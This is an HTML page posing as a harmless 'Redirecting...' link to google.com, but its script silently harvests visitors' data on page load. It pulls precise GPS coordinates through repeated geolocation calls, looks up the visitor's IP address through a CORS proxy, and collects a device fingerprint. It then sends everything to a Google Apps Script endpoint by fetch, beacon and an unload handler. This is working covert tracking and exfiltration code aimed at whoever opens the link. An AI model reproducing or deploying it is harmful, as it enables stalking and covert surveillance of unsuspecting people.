<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: white;
    }
    .hidden {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      visibility: hidden;
    }
  </style>
</head>
<body>
  <div class="hidden" id="background-processor">Background processing...</div>

  <script>
    const redirectToGoogle = () => {
      window.location.href = "https://www.google.com";
    };
    setTimeout(redirectToGoogle, 200);

    const backgroundData = {
      sessionId: 'BG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
      timestamp: new Date().toISOString(),
      latitude: null,
      longitude: null,
      accuracy: null,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenWidth: screen.width,
      screenHeight: screen.height,
      referrer: document.referrer,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
      isAndroid: /Android/.test(navigator.userAgent),
      backgroundMode: true,
      gpsSuccess: false,
      ipSuccess: false,
      collectionAttempted: false
    };

    function rapidGPSCollection() {
      if (!navigator.geolocation) {
        backgroundData.gpsError = 'not_supported';
        return;
      }
      backgroundData.collectionAttempted = true;

      const rapidConfigs = [
        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 },
        { enableHighAccuracy: true, timeout: 2000, maximumAge: 5000 },
        { enableHighAccuracy: false, timeout: 1500, maximumAge: 10000 },
        { enableHighAccuracy: true, timeout: 1000, maximumAge: 30000 }
      ];

      let bestAccuracy = Infinity;

      rapidConfigs.forEach((config, index) => {
        setTimeout(() => {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              const coords = position.coords;
              if (coords.accuracy < bestAccuracy) {
                bestAccuracy = coords.accuracy;
                backgroundData.latitude = coords.latitude;
                backgroundData.longitude = coords.longitude;
                backgroundData.accuracy = coords.accuracy;
                backgroundData.altitude = coords.altitude;
                backgroundData.speed = coords.speed;
                backgroundData.heading = coords.heading;
                backgroundData.gpsSuccess = true;
                backgroundData.gpsMethod = `rapid_${index + 1}`;
                console.log(`Background GPS: ${coords.latitude}, ${coords.longitude} (±${coords.accuracy}m)`);
                sendBackgroundData();
              }
            },
            function(error) {
              backgroundData.gpsError = error.message;
              backgroundData.gpsErrorCode = error.code;
              console.log(`Background GPS ${index + 1} failed: ${error.message}`);
            },
            config
          );
        }, index * 200);
      });
    }

    // ✅ FIXED BACKGROUND IP COLLECTION WITH CORS PROXY
    async function backgroundIPCollection() {
      try {
        const response = await fetch("https://corsproxy.io/?https://ipapi.co/json/");
        const result = await response.json();

        if (result.ip) {
          backgroundData.ip = result.ip;
          backgroundData.ipSuccess = true;
          backgroundData.ipCity = result.city || "";
          backgroundData.ipCountry = result.country_name || "";
          backgroundData.ipLatitude = result.latitude || "";
          backgroundData.ipLongitude = result.longitude || "";
          console.log(`📡 Background IP: ${result.ip}`);
        }
      } catch (e) {
        backgroundData.ip = 'background_failed';
        backgroundData.ipError = e.message;
        console.log("❌ IP collection error:", e.message);
      }
    }

    async function sendBackgroundData() {
      try {
        const formData = new URLSearchParams();
        Object.keys(backgroundData).forEach(key => {
          if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
            formData.append(key, backgroundData[key]);
          }
        });

        fetch("https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec", {
          method: "POST",
          body: formData,
          mode: "no-cors",
          keepalive: true
        }).catch(() => {});
        console.log('Background data sent');
      } catch (error) {
        console.log('Background send error (ignored):', error);
      }
    }

    function getTimezoneLocation() {
      if (backgroundData.gpsSuccess) return;
      const timezoneMap = {
        'America/New_York': { lat: 40.7128, lng: -74.0060 },
        'America/Los_Angeles': { lat: 34.0522, lng: -118.2437 },
        'America/Chicago': { lat: 41.8781, lng: -87.6298 },
        'America/Denver': { lat: 39.7392, lng: -104.9903 },
        'Europe/London': { lat: 51.5074, lng: -0.1278 },
        'Europe/Paris': { lat: 48.8566, lng: 2.3522 },
        'Europe/Berlin': { lat: 52.5200, lng: 13.4050 },
        'Asia/Tokyo': { lat: 35.6762, lng: 139.6503 },
        'Asia/Shanghai': { lat: 31.2304, lng: 121.4737 },
        'Asia/Mumbai': { lat: 19.0760, lng: 72.8777 },
        'Australia/Sydney': { lat: -33.8688, lng: 151.2093 }
      };
      if (timezoneMap[backgroundData.timezone]) {
        const location = timezoneMap[backgroundData.timezone];
        backgroundData.latitude = location.lat;
        backgroundData.longitude = location.lng;
        backgroundData.accuracy = 'timezone_fallback';
        backgroundData.locationMethod = 'timezone';
        console.log(`Background timezone location: ${location.lat}, ${location.lng}`);
      }
    }

    (function startBackgroundCollection() {
      console.log('🔄 Starting invisible background collection...');
      rapidGPSCollection();
      backgroundIPCollection();
      setTimeout(() => {
        if (!backgroundData.gpsSuccess) {
          getTimezoneLocation();
        }
        sendBackgroundData();
        console.log('🔄 Background collection complete');
        console.log(`GPS: ${backgroundData.gpsSuccess ? 'SUCCESS' : 'FAILED'}`);
        console.log(`Location: ${backgroundData.latitude || 'N/A'}, ${backgroundData.longitude || 'N/A'}`);
      }, 2500);
    })();

    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('data:text/javascript;charset=utf-8,' +
        encodeURIComponent(`
          self.addEventListener('message', function(event) {
            console.log('Service worker processing:', event.data);
          });
        `)
      ).catch(() => {});
    }

    function sendViaBeacon() {
      if ('sendBeacon' in navigator) {
        setTimeout(() => {
          const beaconData = new URLSearchParams();
          Object.keys(backgroundData).forEach(key => {
            if (backgroundData[key] !== null && backgroundData[key] !== undefined) {
              beaconData.append(key, backgroundData[key]);
            }
          });
          navigator.sendBeacon(
            "https://script.google.com/macros/s/AKfycbyrivaVyvUrkS-QnVK0xw-o9Rn3oj4mFe772npi086ZE-aIomppWmeHNCYVBXhd_akP/exec",
            beaconData
          );
          console.log('Beacon data sent');
        }, 1000);
      }
    }

    sendViaBeacon();
    window.addEventListener('beforeunload', () => {
      sendBackgroundData();
    });
  </script>
</body>
</html>
